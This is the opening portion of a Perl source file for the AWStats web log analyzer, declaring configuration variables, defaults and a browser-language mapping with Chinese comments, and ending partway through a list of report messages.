#!/usr/bin/perl
#------------------------------------------------------------------------------
# Free realtime web server logfile analyzer to show advanced web statistics.
# Works from command line or as a CGI. You must use this script as often as
# necessary from your scheduler to update your statistics and from command
# line or a browser to read report results.
# See AWStats documentation (in docs/ directory) for all setup instructions.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#------------------------------------------------------------------------------
use v5.20;
use strict;
use warnings;
use utf8;
use feature qw(say state);

# 核心模块
use Time::Local;
use Socket;
use Encode;
use File::Spec;
use JSON::XS;
use Try::Tiny;

# 设置 UTF-8
binmode STDOUT, ':utf8';
binmode STDERR, ':utf8';

# 包变量（现代写法）
our %LangHash;
our %translate_map;
our ($REVISION, $VERSION);

# 初始化
%LangHash      = ();
%translate_map = ();
$REVISION      = '20260310';
$VERSION       = "8.1 (release $REVISION)";

# ----- Constants -----
use vars qw/
  $TEST_MODE $DEBUGFORCED $NBOFLINESFORBENCHMARK $FRAMEWIDTH $NBOFLASTUPDATELOOKUPTOSAVE
  $LIMITFLUSH $NEWDAYVISITTIMEOUT $VISITTIMEOUT $NOTSORTEDRECORDTOLERANCE
  $WIDTHCOLICON $TOOLTIPON
  $lastyearbeforeupdate $lastmonthbeforeupdate $lastdaybeforeupdate $lasthourbeforeupdate $lastdatebeforeupdate
  $NOHTML
  /;
$DEBUGFORCED = 0
  ; # Force debug level to log lesser level into debug.log file (Keep this value to 0)
$NBOFLINESFORBENCHMARK = 8192
  ; # Benchmark info are printing every NBOFLINESFORBENCHMARK lines (Must be a power of 2)
$FRAMEWIDTH = 240;    # Width of left frame when UseFramesWhenCGI is on
$NBOFLASTUPDATELOOKUPTOSAVE =
  500;                # Nb of records to save in DNS last update cache file
$LIMITFLUSH =
  5000;   # Nb of records in data arrays after how we need to flush data on disk
$NEWDAYVISITTIMEOUT = 764041;    # Delay between 01-23:59:59 and 02-00:00:00
$VISITTIMEOUT       = 10000
  ; # Lapse of time to consider a page load as a new visit. 10000 = 1 hour (Default = 10000)
$NOTSORTEDRECORDTOLERANCE = 20000
  ; # Lapse of time to accept a record if not in correct order. 20000 = 2 hour (Default = 20000)
$WIDTHCOLICON = 32;
$TOOLTIPON    = 0;    # Tooltips plugin loaded
$NOHTML       = 0;    # Suppress the html headers

# ----- Running variables -----
use vars qw/
  $DIR $PROG $Extension
  $Debug $ShowSteps
  $DebugResetDone $DNSLookupAlreadyDone
  $RunAsCli $UpdateFor $HeaderHTTPSent $HeaderHTMLSent
  $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum $LastUpdate
  $lowerval
  $PluginMode
  $MetaRobot
  $AverageVisits $AveragePages $AverageHits $AverageBytes
  $TotalUnique $TotalVisits $TotalHostsKnown $TotalHostsUnknown
  $TotalPages $TotalHits $TotalBytes $TotalHitsErrors
  $TotalNotViewedPages $TotalNotViewedHits $TotalNotViewedBytes
  $TotalEntries $TotalExits $TotalBytesPages $TotalDifferentPages
  $TotalKeyphrases $TotalKeywords $TotalDifferentKeyphrases $TotalDifferentKeywords
  $TotalSearchEnginesPages $TotalSearchEnginesHits $TotalRefererPages $TotalRefererHits $TotalDifferentSearchEngines $TotalDifferentReferer
  $FrameName $Center $FileConfig $FileSuffix $Host $YearRequired $MonthRequired $DayRequired $HourRequired
  $QueryString $SiteConfig $StaticLinks $PageCode $PageDir $PerlParsingFormat $PerlParsingFormatJsonMap $UserAgent
  $pos_vh $pos_host $pos_logname $pos_date $pos_tz $pos_method $pos_url $pos_code $pos_size $pos_time
  $pos_referer $pos_agent $pos_query $pos_gzipin $pos_gzipout $pos_compratio $pos_timetaken
  $pos_cluster $pos_emails $pos_emailr $pos_hostr @pos_extra
  /;
$DIR = $PROG = $Extension = '';
$Debug          = $ShowSteps            = 0;
$DebugResetDone = $DNSLookupAlreadyDone = 0;
$RunAsCli       = $UpdateFor            = $HeaderHTTPSent = $HeaderHTMLSent = 0;
$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;
$LastUpdate          = 0;
$lowerval            = 0;
$PluginMode          = '';
$MetaRobot           = 0;
$AverageVisits = $AveragePages = $AverageHits = $AverageBytes = 0; 
$TotalUnique         = $TotalVisits = $TotalHostsKnown = $TotalHostsUnknown = 0;
$TotalPages          = $TotalHits = $TotalBytes = $TotalHitsErrors = 0;
$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;
$TotalEntries = $TotalExits = $TotalBytesPages = $TotalDifferentPages = 0;
$TotalKeyphrases = $TotalKeywords = $TotalDifferentKeyphrases = 0;
$TotalDifferentKeywords = 0;
$TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;
$TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;
(
	$FrameName,    $Center,       $FileConfig,        $FileSuffix,
	$Host,         $YearRequired, $MonthRequired,     $DayRequired,
	$HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,
	$PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent,
    $PerlParsingFormatJsonMap
  )
  = ( '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', undef );

# ----- Plugins variable -----
use vars qw/ %PluginsLoaded $PluginDir $AtLeastOneSectionPlugin /;
%PluginsLoaded           = ();
$PluginDir               = '';
$AtLeastOneSectionPlugin = 0;

# ----- Time vars -----
use vars qw/
  $starttime
  $nowtime $tomorrowtime
  $nowweekofmonth $nowweekofyear $nowdaymod $nowsmallyear
  $nowsec $nowmin $nowhour $nowday $nowmonth $nowyear $nowwday $nowyday $nowns
  $StartSeconds $StartMicroseconds
  /;
$StartSeconds = $StartMicroseconds = 0;

# ----- Variables for config file reading -----
use vars qw/
  $FoundNotPageList
  /;
$FoundNotPageList = 0;

# ----- Config file variables -----
use vars qw/
  $StaticExt
  $DNSStaticCacheFile
  $DNSLastUpdateCacheFile
  $MiscTrackerUrl
  $Lang
  $MaxRowsInHTMLOutput
  $MaxLengthOfShownURL
  $MaxLengthOfStoredURL
  $MaxLengthOfStoredUA
  %BarPng
  $BuildReportFormat
  $BuildHistoryFormat
  $ExtraTrackedRowsLimit
  $DatabaseBreak
  $SectionsToBeSaved
  /;
$StaticExt              = 'html';
$DNSStaticCacheFile     = 'dnscache.txt';
$DNSLastUpdateCacheFile = 'dnscachelastupdate.txt';
$MiscTrackerUrl         = '/js/awstats_misc_tracker.js';
$Lang                   = 'auto';
$SectionsToBeSaved      = 'all';
$MaxRowsInHTMLOutput    = 1000;
$MaxLengthOfShownURL    = 64;
$MaxLengthOfStoredURL = 256;  # Note: Apache LimitRequestLine is default to 8190
$MaxLengthOfStoredUA  = 256;
%BarPng               = (
	'vv' => 'vv.png',
	'vu' => 'vu.png',
	'hu' => 'hu.png',
	'vp' => 'vp.png',
	'hp' => 'hp.png',
	'he' => 'he.png',
	'hx' => 'hx.png',
	'vh' => 'vh.png',
	'hh' => 'hh.png',
	'vk' => 'vk.png',
	'hk' => 'hk.png'
);
$BuildReportFormat     = 'html';
$BuildHistoryFormat    = 'text';
$ExtraTrackedRowsLimit = 500;
$DatabaseBreak         = 'month';
use vars qw/
  $DebugMessages $AllowToUpdateStatsFromBrowser $EnableLockForUpdate $DNSLookup $DynamicDNSLookup $AllowAccessFromWebToAuthenticatedUsersOnly
  $BarHeight $BarWidth $CreateDirDataIfNotExists $KeepBackupOfHistoricFiles
  $NbOfLinesParsed $NbOfLinesDropped $NbOfLinesCorrupted $NbOfLinesComment $NbOfLinesBlank $NbOfOldLines $NbOfNewLines
  $NbOfLinesShowsteps $NewLinePhase $NbOfLinesForCorruptedLog $PurgeLogFile $ArchiveLogRecords
  $ShowDropped $ShowCorrupted $ShowUnknownOrigin $ShowDirectOrigin $ShowLinksToWhoIs
  $ShowAuthenticatedUsers $ShowFileSizesStats $ShowRequestTimesStats $ShowScreenSizeStats $ShowSMTPErrorsStats
  $ShowEMailSenders $ShowEMailReceivers $ShowWormsStats $ShowClusterStats
  $IncludeInternalLinksInOriginSection
  $AuthenticatedUsersNotCaseSensitive
  $Expires $UpdateStats $MigrateStats $URLNotCaseSensitive $URLWithQuery $URLReferrerWithQuery
  $DecodeUA $DecodePunycode
  /;
(
	$DebugMessages,
	$AllowToUpdateStatsFromBrowser,
	$EnableLockForUpdate,
	$DNSLookup,
	$DynamicDNSLookup,
	$AllowAccessFromWebToAuthenticatedUsersOnly,
	$BarHeight,
	$BarWidth,
	$CreateDirDataIfNotExists,
	$KeepBackupOfHistoricFiles,
	$NbOfLinesParsed,
	$NbOfLinesDropped,
	$NbOfLinesCorrupted,
	$NbOfLinesComment,
	$NbOfLinesBlank,
	$NbOfOldLines,
	$NbOfNewLines,
	$NbOfLinesShowsteps,
	$NewLinePhase,
	$NbOfLinesForCorruptedLog,
	$PurgeLogFile,
	$ArchiveLogRecords,
	$ShowDropped,
	$ShowCorrupted,
	$ShowUnknownOrigin,
	$ShowDirectOrigin,
	$ShowLinksToWhoIs,
	$ShowAuthenticatedUsers,
	$ShowFileSizesStats,
	$ShowRequestTimesStats,
	$ShowScreenSizeStats,
	$ShowSMTPErrorsStats,
	$ShowEMailSenders,
	$ShowEMailReceivers,
	$ShowWormsStats,
	$ShowClusterStats,
	$IncludeInternalLinksInOriginSection,
	$AuthenticatedUsersNotCaseSensitive,
	$Expires,
	$UpdateStats,
	$MigrateStats,
	$URLNotCaseSensitive,
	$URLWithQuery,
	$URLReferrerWithQuery,
	$DecodeUA,
	$DecodePunycode
  )
  = (
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0
  );
use vars qw/
  $DetailedReportsOnNewWindows
  $FirstDayOfWeek $KeyWordsNotSensitive $SaveDatabaseFilesWithPermissionsForEveryone
  $WarningMessages $ShowLinksOnUrl $UseFramesWhenCGI
  $ShowMenu $ShowSummary $ShowMonthStats $ShowDaysOfMonthStats $ShowDaysOfWeekStats
  $ShowHoursStats $ShowDomainsStats $ShowHostsStats
  $ShowRobotsStats $ShowSessionsStats $ShowPagesStats $ShowFileTypesStats $ShowDownloadsStats
  $ShowOSStats $ShowBrowsersStats $ShowOriginStats
  $ShowKeyphrasesStats $ShowKeywordsStats $ShowMiscStats $ShowHTTPErrorsStats $ShowHTTPErrorsPageDetail
  $AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats $AddDataArrayShowHoursStats
  /;
(
	$DetailedReportsOnNewWindows,
	$FirstDayOfWeek,
	$KeyWordsNotSensitive,
	$SaveDatabaseFilesWithPermissionsForEveryone,
	$WarningMessages,
	$ShowLinksOnUrl,
	$UseFramesWhenCGI,
	$ShowMenu,
	$ShowSummary,
	$ShowMonthStats,
	$ShowDaysOfMonthStats,
	$ShowDaysOfWeekStats,
	$ShowHoursStats,
	$ShowDomainsStats,
	$ShowHostsStats,
	$ShowRobotsStats,
	$ShowSessionsStats,
	$ShowPagesStats,
	$ShowFileTypesStats,
	$ShowDownloadsStats,
	$ShowOSStats,
	$ShowBrowsersStats,
	$ShowOriginStats,
	$ShowKeyphrasesStats,
	$ShowKeywordsStats,
	$ShowMiscStats,
	$ShowHTTPErrorsStats,
	$ShowHTTPErrorsPageDetail,
	$AddDataArrayMonthStats,
	$AddDataArrayShowDaysOfMonthStats,
	$AddDataArrayShowDaysOfWeekStats,
	$AddDataArrayShowHoursStats
  )
  = (
	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
	1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
  );
use vars qw/
  $AllowFullYearView
  $LevelForRobotsDetection $LevelForWormsDetection $LevelForBrowsersDetection $LevelForOSDetection $LevelForRefererAnalyze
  $LevelForFileTypesDetection $LevelForSearchEnginesDetection $LevelForKeywordsDetection
  /;
(
	$AllowFullYearView,          $LevelForRobotsDetection,
	$LevelForWormsDetection,     $LevelForBrowsersDetection,
	$LevelForOSDetection,        $LevelForRefererAnalyze,
	$LevelForFileTypesDetection, $LevelForSearchEnginesDetection,
	$LevelForKeywordsDetection
  )
  = ( 2, 2, 0, 2, 2, 2, 2, 2, 2 );
use vars qw/
  $DirLock $DirCgi $DirConfig $DirData $DirIcons $DirLang $AWScript $ArchiveFileName
  $AllowAccessFromWebToFollowingIPAddresses $HTMLHeadSection $HTMLEndSection $LinksToWhoIs $LinksToIPWhoIs
  $LogFile $LogType $LogFormat $LogSeparator $Logo $LogoLink $StyleSheet $WrapperScript $SiteDomain
  $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor $ErrorMessages $ShowFlagLinks
  $AddLinkToExternalCGIWrapper $LogFormatJsonMap
  /;
(
	$DirLock,                                  $DirCgi,
	$DirConfig,                                $DirData,
	$DirIcons,                                 $DirLang,
	$AWScript,                                 $ArchiveFileName,
	$AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,
	$HTMLEndSection,                           $LinksToWhoIs,
	$LinksToIPWhoIs,                           $LogFile,
	$LogType,                                  $LogFormat,
	$LogSeparator,                             $Logo,
	$LogoLink,                                 $StyleSheet,
	$WrapperScript,                            $SiteDomain,
	$UseHTTPSLinkForUrl,                       $URLQuerySeparators,
	$URLWithAnchor,                            $ErrorMessages,
	$ShowFlagLinks,                            $AddLinkToExternalCGIWrapper,
    $LogFormatJsonMap
  )
  = (
	'', '', '', '', '', '', '', '', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '', '', '', '', '', '', '', '', ''
  );
use vars qw/
  $color_Background $color_TableBG $color_TableBGRowTitle
  $color_TableBGTitle $color_TableBorder $color_TableRowTitle $color_TableTitle
  $color_text $color_textpercent $color_titletext $color_weekend $color_link $color_hover $color_other
  $color_h $color_k $color_p $color_e $color_x $color_s $color_u $color_v
  /;
(
	$color_Background,   $color_TableBG,     $color_TableBGRowTitle,
	$color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,
	$color_TableTitle,   $color_text,        $color_textpercent,
	$color_titletext,    $color_weekend,     $color_link,
	$color_hover,        $color_other,       $color_h,
	$color_k,            $color_p,           $color_e,
	$color_x,            $color_s,           $color_u,
	$color_v
  )
  = (
	'', '', '', '', '', '', '', '', '', '', '', '',
	'', '', '', '', '', '', '', '', '', ''
  );

# ---------- Init arrays --------
use vars qw/
  @RobotsSearchIDOrder_list1 @RobotsSearchIDOrder_list2 @RobotsSearchIDOrder_listgen
  @SearchEnginesSearchIDOrder_list1 @SearchEnginesSearchIDOrder_list2 @SearchEnginesSearchIDOrder_listgen
  @BrowsersSearchIDOrder @OSSearchIDOrder @WordsToCleanSearchUrl
  @WormsSearchIDOrder
  @RobotsSearchIDOrder @SearchEnginesSearchIDOrder
  @_from_p @_from_h
  @_time_p @_time_h @_time_k @_time_nv_p @_time_nv_h @_time_nv_k
  @DOWIndex @fieldlib @keylist
  /;
@RobotsSearchIDOrder = @SearchEnginesSearchIDOrder = ();
@_from_p = @_from_h = ();
@_time_p = @_time_h = @_time_k = @_time_nv_p = @_time_nv_h = @_time_nv_k = ();
@DOWIndex = @fieldlib = @keylist = ();
use vars qw/
  @MiscListOrder %MiscListCalc
  %OSFamily %BrowsersFamily @SessionsRange %SessionsAverage
  @PayloadRange %PayloadAverage
  @TimeRange %TimeAverage
  %LangBrowserToLangFile
  %LangBrowserToLangAwstats %LangAWStatsToFlagAwstats %BrowsersSafariBuildToVersionHash
  @HostAliases @AllowAccessFromWebToFollowingAuthenticatedUsers
  @DefaultFile @SkipDNSLookupFor
  @SkipHosts @SkipUserAgents @SkipFiles @SkipReferrers @NotPageFiles
  @OnlyHosts @OnlyUserAgents @OnlyFiles @OnlyUsers
  @URLWithQueryWithOnly @URLWithQueryWithout
  @ExtraName @ExtraCondition @ExtraStatTypes @MaxNbOfExtra @MinHitExtra
  @ExtraFirstColumnTitle @ExtraFirstColumnValues @ExtraFirstColumnFunction @ExtraFirstColumnFormat
  @ExtraCodeFilter @ExtraConditionType @ExtraConditionTypeVal
  @ExtraFirstColumnValuesType @ExtraFirstColumnValuesTypeVal
  @ExtraAddAverageRow @ExtraAddSumRow
  @PluginsToLoad
  /;
@MiscListOrder = (
	'AddToFavourites',  'JavascriptDisabled',
	'JavaEnabled',      'DirectorSupport',
	'FlashSupport',     'RealPlayerSupport',
	'QuickTimeSupport', 'WindowsMediaPlayerSupport',
	'PDFSupport'
);
%MiscListCalc = (
	'TotalMisc'                 => '',
	'AddToFavourites'           => 'u',
	'JavascriptDisabled'        => 'hm',
	'JavaEnabled'               => 'hm',
	'DirectorSupport'           => 'hm',
	'FlashSupport'              => 'hm',
	'RealPlayerSupport'         => 'hm',
	'QuickTimeSupport'          => 'hm',
	'WindowsMediaPlayerSupport' => 'hm',
	'PDFSupport'                => 'hm'
);
@SessionsRange =
  ( '0s-30s', '30s-2mn', '2mn-5mn', '5mn-15mn', '15mn-30mn', '30mn-1h', '1h+' );
%SessionsAverage = (
	'0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,
	'5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,
	'1h+',      3600
);

@PayloadRange = ('0-44', '44-100', '100-500', '500-1K', '1K-2K', '2K-5K', '5K+');
%PayloadAverage = (
        '0-44', 44, '44-100', 100, '100-500', 500, '500-1K', 1024,
        '1K-2K', 2048, '2K-5K', 5120, '5K+', 5121
);

@TimeRange = ('0-44', '44-100', '100-500', '500-1K', '1K-2K', '2K-5K', '5K+');
%TimeAverage = (
        '0-44', 44, '44-100', 100, '100-500', 500, '500-1K', 1024,
        '1K-2K', 2048, '2K-5K', 5120, '5K+', 5121
);

# HTTP-Accept or Lang parameter => AWStats code to use for lang
# ISO-639-1 or 2 or other       => awstats-xx.txt where xx is ISO-639-1
%LangBrowserToLangAwstats = (
    # 简体中文 - 处理各种变体
    'zh'        => 'zh-cn',
    'zh-cn'     => 'zh-cn',
    'zh_cn'     => 'zh-cn',
    'zh-CN'     => 'zh-cn',
    'zh_CN'     => 'zh-cn',
    'cn'        => 'zh-cn',
    'chinese'   => 'zh-cn',
    'zh-hans'   => 'zh-cn',
    'zh_hans'   => 'zh-cn',
    'zh-Hans'   => 'zh-cn',
    'zh_Hans'   => 'zh-cn',
    'zh-sg'     => 'zh-cn',
    'zh_sg'     => 'zh-cn',
    'zh-SG'     => 'zh-cn',
    'zh_SG'     => 'zh-cn',
    
    # 繁体中文
    'zh-tw'     => 'zh-tw',
    'zh_tw'     => 'zh-tw',
    'zh-TW'     => 'zh-tw',
    'zh_TW'     => 'zh-tw',
    'tw'        => 'zh-tw',
    'zh-hant'   => 'zh-tw',
    'zh_hant'   => 'zh-tw',
    'zh-Hant'   => 'zh-tw',
    'zh_Hant'   => 'zh-tw',
    'zh-hk'     => 'zh-tw',
    'zh_hk'     => 'zh-tw',
    'zh-HK'     => 'zh-tw',
    'zh_HK'     => 'zh-tw',
    'zh-mo'     => 'zh-tw',
    'zh_mo'     => 'zh-tw',
    'zh-MO'     => 'zh-tw',
    'zh_MO'     => 'zh-tw',
    
    # 葡萄牙语（欧洲）
    'pt'        => 'pt',
    'pt-pt'     => 'pt',
    'pt_pt'     => 'pt',
    'pt-PT'     => 'pt',
    'pt_PT'     => 'pt',
    'portuguese'=> 'pt',
    
    # 葡萄牙语（巴西）
    'pt-br'     => 'pt-br',
    'pt_br'     => 'pt-br',
    'pt-BR'     => 'pt-br',
    'pt_BR'     => 'pt-br',
    'br'        => 'pt-br',
    'brazil'    => 'pt-br',
    
    # 乌克兰语
    'uk'        => 'ua',
    'ua'        => 'ua',
    'uk-ua'     => 'ua',
    'uk_ua'     => 'ua',
    'uk-UA'     => 'ua',
    'uk_UA'     => 'ua',
    'ukraine'   => 'ua',
    
    # 阿尔巴尼亚语
    'sq'        => 'al',
    'al'        => 'al',
    'albanian'  => 'al',
    
    # 阿拉伯语
    'ar'        => 'ar',
    'arabic'    => 'ar',
    
    # 巴什基尔语
    'ba'        => 'ba',
    'bashkir'   => 'ba',
    
    # 保加利亚语
    'bg'        => 'bg',
    'bulgarian' => 'bg',
    
    # 捷克语
    'cs'        => 'cz',
    'cz'        => 'cz',
    'czech'     => 'cz',
    
    # 德语
    'de'        => 'de',
    'german'    => 'de',
    
    # 丹麦语
    'da'        => 'dk',
    'dk'        => 'dk',
    'danish'    => 'dk',
    
    # 英语
    'en'        => 'en',
    'english'   => 'en',
    'en-us'     => 'en',
    'en_us'     => 'en',
    'en-US'     => 'en',
    'en_US'     => 'en',
    'en-gb'     => 'en',
    'en_gb'     => 'en',
    'en-GB'     => 'en',
    'en_GB'     => 'en',
    
    # 爱沙尼亚语
    'et'        => 'et',
    'estonian'  => 'et',
    
    # 芬兰语
    'fi'        => 'fi',
    'finnish'   => 'fi',
    
    # 法语
    'fr'        => 'fr',
    'french'    => 'fr',
    'fr-fr'     => 'fr',
    'fr_fr'     => 'fr',
    'fr-FR'     => 'fr',
    'fr_FR'     => 'fr',
    'fr-ca'     => 'fr',
    'fr_ca'     => 'fr',
    'fr-CA'     => 'fr',
    'fr_CA'     => 'fr',
    
    # 加利西亚语
    'gl'        => 'gl',
    'galician'  => 'gl',
    
    # 西班牙语
    'es'        => 'es',
    'spanish'   => 'es',
    'es-es'     => 'es',
    'es_es'     => 'es',
    'es-ES'     => 'es',
    'es_ES'     => 'es',
    'es-mx'     => 'es',
    'es_mx'     => 'es',
    'es-MX'     => 'es',
    'es_MX'     => 'es',
    
    # 巴斯克语
    'eu'        => 'eu',
    'basque'    => 'eu',
    
    # 加泰罗尼亚语
    'ca'        => 'ca',
    'catalan'   => 'ca',
    
    # 希腊语
    'el'        => 'gr',
    'gr'        => 'gr',
    'greek'     => 'gr',
    
    # 匈牙利语
    'hu'        => 'hu',
    'hungarian' => 'hu',
    
    # 冰岛语
    'is'        => 'is',
    'icelandic' => 'is',
    
    # 印度尼西亚语
    'in'        => 'id',
    'id'        => 'id',
    'indonesian'=> 'id',
    
    # 意大利语
    'it'        => 'it',
    'italian'   => 'it',
    'it-it'     => 'it',
    'it_it'     => 'it',
    'it-IT'     => 'it',
    'it_IT'     => 'it',
    
    # 拉脱维亚语
    'lv'        => 'lv',
    'latvian'   => 'lv',
    
    # 荷兰语
    'nl'        => 'nl',
    'dutch'     => 'nl',
    'nl-nl'     => 'nl',
    'nl_nl'     => 'nl',
    'nl-NL'     => 'nl',
    'nl_NL'     => 'nl',
    'nl-be'     => 'nl',
    'nl_be'     => 'nl',
    'nl-BE'     => 'nl',
    'nl_BE'     => 'nl',
    
    # 挪威语
    'no'        => 'nb',
    'nb'        => 'nb',
    'norwegian' => 'nb',
    'nn'        => 'nn',
    'nynorsk'   => 'nn',
    
    # 波兰语
    'pl'        => 'pl',
    'polish'    => 'pl',
    
    # 罗马尼亚语
    'ro'        => 'ro',
    'romanian'  => 'ro',
    
    # 俄语
    'ru'        => 'ru',
    'russian'   => 'ru',
    'ru-ru'     => 'ru',
    'ru_ru'     => 'ru',
    'ru-RU'     => 'ru',
    'ru_RU'     => 'ru',
    
    # 塞尔维亚语
    'sr'        => 'sr',
    'serbian'   => 'sr',
    
    # 斯洛伐克语
    'sk'        => 'sk',
    'slovak'    => 'sk',
    
    # 瑞典语
    'sv'        => 'se',
    'se'        => 'se',
    'swedish'   => 'se',
    
    # 泰语
    'th'        => 'th',
    'thai'      => 'th',
    
    # 土耳其语
    'tr'        => 'tr',
    'turkish'   => 'tr',
    
    # 日语
    'ja'        => 'jp',
    'jp'        => 'jp',
    'japanese'  => 'jp',
    'ja-jp'     => 'jp',
    'ja_jp'     => 'jp',
    'ja-JP'     => 'jp',
    'ja_JP'     => 'jp',
    
    # 韩语
    'kr'        => 'ko',
    'ko'        => 'ko',
    'korean'    => 'ko',
    'ko-kr'     => 'ko',
    'ko_kr'     => 'ko',
    'ko-KR'     => 'ko',
    'ko_KR'     => 'ko',
    
    # 威尔士语
    'cy'        => 'cy',
    'welsh'     => 'cy',
    'wlk'       => 'cy',
);
%LangAWStatsToFlagAwstats =
  (  # If flag (country ISO-3166 two letters) is not same than AWStats Lang code
	'ca' => 'es_cat',
	'et' => 'ee',
	'eu' => 'es_eu',
	'cy' => 'wlk',
	'gl' => 'glg',
	'he' => 'il',
	'ko' => 'kr',
	'ar' => 'sa',
	'sr' => 'cs'
  );

@HostAliases = @AllowAccessFromWebToFollowingAuthenticatedUsers = ();
@DefaultFile = @SkipDNSLookupFor = ();
@SkipHosts = @SkipUserAgents = @NotPageFiles = @SkipFiles = @SkipReferrers = ();
@OnlyHosts = @OnlyUserAgents = @OnlyFiles = @OnlyUsers = ();
@URLWithQueryWithOnly     = @URLWithQueryWithout    = ();
@ExtraName                = @ExtraCondition         = @ExtraStatTypes = ();
@MaxNbOfExtra             = @MinHitExtra            = ();
@ExtraFirstColumnTitle    = @ExtraFirstColumnValues = ();
@ExtraFirstColumnFunction = @ExtraFirstColumnFormat = ();
@ExtraCodeFilter = @ExtraConditionType = @ExtraConditionTypeVal = ();
@ExtraFirstColumnValuesType = @ExtraFirstColumnValuesTypeVal = ();
@ExtraAddAverageRow         = @ExtraAddSumRow                = ();
@PluginsToLoad              = ();

# ---------- Init hash arrays --------
use vars qw/
  %BrowsersHashIDLib %BrowsersHashIcon %BrowsersHereAreGrabbers
  %DomainsHashIDLib
  %MimeHashLib %MimeHashFamily
  %OSHashID %OSHashLib
  %RobotsHashIDLib %RobotsAffiliateLib
  %SearchEnginesHashID %SearchEnginesHashLib %SearchEnginesWithKeysNotInQuery %SearchEnginesKnownUrl %NotSearchEnginesKeys
  %WormsHashID %WormsHashLib %WormsHashTarget
  /;
use vars qw/
  %HTMLOutput %NoLoadPlugin %FilterIn %FilterEx
  %BadFormatWarning
  %MonthNumLib
  %ValidHTTPCodes %ValidSMTPCodes
  %TrapInfosForHTTPErrorCodes %NotPageList %DayBytes %DayHits %DayPages %DayVisits
  %MaxNbOf %MinHit
  %ListOfYears %HistoryAlreadyFlushed %PosInFile %ValueInFile
  %val %nextval %egal
  %TmpDNSLookup %TmpOS %TmpRefererServer %TmpRobot %TmpBrowser %MyDNSTable
  /;
%HTMLOutput = %NoLoadPlugin = %FilterIn = %FilterEx = ();
%BadFormatWarning           = ();
%MonthNumLib                = ();
%ValidHTTPCodes             = %ValidSMTPCodes = ();
%TrapInfosForHTTPErrorCodes = ();
%NotPageList = ();
%DayBytes    = %DayHits               = %DayPages  = %DayVisits   = ();
%MaxNbOf     = %MinHit                = ();
%ListOfYears = %HistoryAlreadyFlushed = %PosInFile = %ValueInFile = ();
%val = %nextval = %egal = ();
%TmpDNSLookup = %TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();
%MyDNSTable = ();
use vars qw/
  %FirstTime %LastTime
  %MonthHostsKnown %MonthHostsUnknown
  %MonthUnique %MonthVisits
  %MonthPages %MonthHits %MonthBytes
  %MonthNotViewedPages %MonthNotViewedHits %MonthNotViewedBytes
  %_session %_browser_h %_browser_p
  %_filesize
  %_requesttime
  %_domener_p %_domener_h %_domener_k %_errors_h %_errors_k
  %_filetypes_h %_filetypes_k %_filetypes_gz_in %_filetypes_gz_out
  %_host_p %_host_h %_host_k %_host_l %_host_s %_host_u
  %_waithost_e %_waithost_l %_waithost_s %_waithost_u
  %_keyphrases %_keywords %_os_h %_os_p %_pagesrefs_p %_pagesrefs_h %_robot_h %_robot_k %_robot_l %_robot_r
  %_worm_h %_worm_k %_worm_l %_login_h %_login_p %_login_k %_login_l %_screensize_h
  %_misc_p %_misc_h %_misc_k
  %_cluster_p %_cluster_h %_cluster_k
  %_se_referrals_p %_se_referrals_h %_sider_h %_referer_h %_err_host_h %_url_p %_url_k %_url_e %_url_x
  %_downloads
  %_unknownreferer_l %_unknownrefererbrowser_l
  %_emails_h %_emails_k %_emails_l %_emailr_h %_emailr_k %_emailr_l
  /;
&Init_HashArray();

# ---------- Init Regex --------
use vars qw/ $regclean1 $regclean2 $regdate /;
$regclean1 = qr/<(recnb|\/td)>/i;
$regclean2 = qr/<\/?[^<>]+>/i;
$regdate   = qr/(\d\d\d\d)(\d\d)(\d\d)(\d\d)(\d\d)(\d\d)/;

# ---------- Init Tie::hash arrays --------
# Didn't find a tie that increase speed
#use Tie::StdHash;
#use Tie::Cache::LRU;
#tie %_host_p, 'Tie::StdHash';
#tie %TmpOS, 'Tie::Cache::LRU';

# PROTOCOL CODES
use vars qw/ %httpcodelib %ftpcodelib %smtpcodelib /;

# DEFAULT MESSAGE
use vars qw/ @Message /;
@Message = (
	'Unknown',
	'Unknown (unresolved ip)',
	'Others',
	'View details',
	'Day',
	'Month',
	'Year',
	'Statistics for',
	'First visit',
	'Last visit',
	'Number of visits',
	'Unique visitors',
	'Visit',
	'different keywords',
	'Search',
	'Percent',
	'Traffic',
	'Domains/Countries',
	'Visitors',
	'Pages-URL',
	'Hours',
	'Browsers',
	'',
	'Referers',
	'Never updated (See \'Build/Update\' on awstats_setup.html page)',
	'Visitors domains/countries',
	'hosts',
	'pages',
	'different pages-url',
	'Viewed',
	'Other words',
	'Pages not found',
	'HTTP Error codes',
	'Netscape versions',
	'IE versions',
	'Last Update',
	'Connect to site from',
	'Origin',
	'Direct address / Bookmarks',
	'Origin unknown',
	'Links from an Internet Search Engine',
	'Links from an external page (other web sites except search engines)',
	'Links from an internal page (other page on same site)',
	'Keyphrases used on search engines',
	'Keywords used on search engines',
